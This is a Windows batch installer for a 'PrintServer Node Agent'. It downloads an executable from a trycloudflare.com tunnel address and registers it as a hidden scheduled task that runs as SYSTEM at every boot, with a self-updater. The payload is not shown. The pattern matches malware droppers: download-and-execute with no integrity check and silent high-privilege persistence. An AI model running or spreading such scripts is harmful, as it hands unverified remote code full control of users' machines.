@echo off
:: PrintServer Pro Node Agent Installer
:: Run this as Administrator
echo ==============================================
echo Installing PrintServer Node Agent as a Service
echo ==============================================

:: Ensure Admin Privileges
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Administrator rights confirmed.
) else (
    echo ERROR: Please run this script as Administrator.
    pause
    exit /b 1
)

set SERVER_URL=https://canvas-harvest-out-kings.trycloudflare.com
set TARGET_DIR=%APPDATA%\printserver-agent
set EXE_PATH=%TARGET_DIR%\printserver-agent.exe

echo [1/4] Creating installation directory at %TARGET_DIR%...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo [2/4] Downloading latest agent from server...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%SERVER_URL%/api/downloads/agent' -OutFile '%EXE_PATH%'"

if not exist "%EXE_PATH%" (
    echo ERROR: Failed to download agent executable.
    pause
    exit /b 1
)

echo [3/4] Creating Windows Task Scheduler for Auto-Boot (Background)...
:: We use Task Scheduler instead of SC to avoid needing NSSM binary wrapper
powershell -Command "$action = New-ScheduledTaskAction -Execute '%EXE_PATH%'; $trigger = New-ScheduledTaskTrigger -AtStartup; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal; Register-ScheduledTask -TaskName 'PrintServerNodeAgent' -InputObject $task -Force"

echo [4/4] Starting the Agent now...
powershell -Command "Start-ScheduledTask -TaskName 'PrintServerNodeAgent'"

echo ==============================================
echo [SUCCESS] PrintServer Node Agent installed!
echo - It is now running silently in the background.
echo - It will start automatically every time the PC boots.
echo - Auto-updater is active (checks every 30 mins).
echo ==============================================
pause
